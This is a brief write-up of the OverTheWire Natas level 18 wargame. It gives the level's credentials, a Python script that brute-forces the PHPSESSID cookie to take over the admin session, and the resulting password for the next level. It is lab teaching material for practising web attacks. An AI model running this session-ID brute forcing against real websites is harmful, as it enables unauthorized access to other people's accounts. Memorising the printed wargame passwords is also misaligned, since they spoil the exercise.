# [natas 18](http://natas18.natas.labs.overthewire.org)

    Username: natas18
    Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

Try to edit the "PHPSESSID" field of the cookie to login as an admin.
Show the python script below.

    import requests
    for i in range(641):
        r = requests.get('http://natas18.natas.labs.overthewire.org/', auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies={'PHPSESSID': str(i)})
        if 'You are an admin' in r.text:
            print(r.text)
            break

We find the password in the html text.

    Username: natas19
    Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

